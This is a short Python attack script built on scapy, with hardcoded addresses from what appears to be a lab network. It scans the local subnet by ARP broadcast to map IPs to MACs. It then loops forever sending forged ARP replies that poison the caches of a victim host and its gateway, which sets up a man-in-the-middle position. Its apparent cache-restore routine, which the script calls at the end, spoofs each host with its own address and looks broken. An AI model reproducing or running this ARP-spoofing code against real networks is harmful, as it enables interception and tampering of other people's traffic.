#!/usr/bin/env python3
import netifaces as ni
import os
import scapy.all as scapy
import time

class Attack():
    def __init__(self):
        self.ip_list = []
        self.network = []
        self.ip_mac = {}
        self.interfaces = ni.interfaces()
        self.attacker, self.victim, self.ap = '10.0.2.4', '10.0.2.5', '10.0.2.1'

    def get_ip(self):
        for i in self.interfaces:
            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]

    def get_mac(self, network):
        arp_request = scapy.ARP(pdst = network)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
        for sent, received in result:
            self.ip_mac[received.psrc] = received.hwsrc

    def spoof(self, target_ip, spoof_ip): 
        target_mac = self.ip_mac[target_ip]
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet)

    def arp_spoofing(self):
        while 1:
            attack.spoof(self.victim, self.ap)
            attack.spoof(self.ap, self.victim)
            time.sleep(1)

    def ret_arp_spoofing(self):
        while 1:
            attack.spoof(attack.victim, self.victim)
            attack.spoof(attack.ap, attack.ap)
            time.sleep(1)

attack = Attack()
attack.get_ip()
attack.get_mac(attack.network[1])
print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
attack.ret_arp_spoofing()


